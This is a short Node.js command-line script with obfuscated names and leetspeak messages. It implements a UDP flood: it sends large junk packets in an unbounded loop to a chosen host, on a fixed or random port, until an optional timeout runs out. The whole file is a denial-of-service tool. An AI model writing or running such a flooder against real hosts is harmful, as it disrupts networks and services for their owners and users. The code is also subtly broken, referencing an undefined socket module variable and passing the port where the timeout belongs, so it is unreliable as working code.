const _0x00 = require('commander');

const _0x01 = _0x00.version('0.69.0')
    .option('-h,  <H>', 'H N4,443/!P')
    .option('-p,  [P]', '!f n0x00t d3f!n3d, _0x00 w!ll us3 r4nd044 P.', parseInt)
    .option('-t,  [T]', 'T !n 44!ll!s3c. !f n0x00t d3f!n3d, !t w!ll b unl!m!t3d.', parseInt);

_0x01.parse(process.argv);

if (_0x00.host) {
    if (!_0x00.timeout) {
        _0x00.confirm('R U sur3 U wAnt t0 c0nt!nu3 w!thouT t!m30uT?', function (_0x003) {
            if (!_0x003) {
                console.log("0K, !'ll ST0x00P h3r3.");
                process.stdin.destroy();
            } else {
                _0x09(_0x00.host, _0x00.port, _0x00.port);
            }

        });
    } else {
        _0x09(_0x00.host, _0x00.port, _0x00.timeout);
    }
} else {
    _0x01.help();
}


function _0x09(h, p, t) {
    let H_0 = h;
    let D_0 = require('dgram');
    let C_0 = dgram.createSocket('udp4');

    let O_0 = "";
    for (let _0x005 = 65553; _0x005 >= 0; _0x005--) {
        O_0 += "X";
    };
    let ST_0 = new Date();
    while (1) {
        if (t) {
            let NT_0 = new Date();
            if (NT_0.getTime() >= (ST_0.getTime() + t)) {
                break;
            }
        }
        let _0x006 = new Buffer(O_0);
        (function (p) {
            C_0.send(_0x006, 0, _0x006.length, p, h, function (err, bytes) {
                if (err) throw err;
                console.log('U R DP _0x006 sNt t0x00 ' + h + ':' + p);
            });
        })(p || Math.floor(Math.random() * (65553) + 1));
    }
}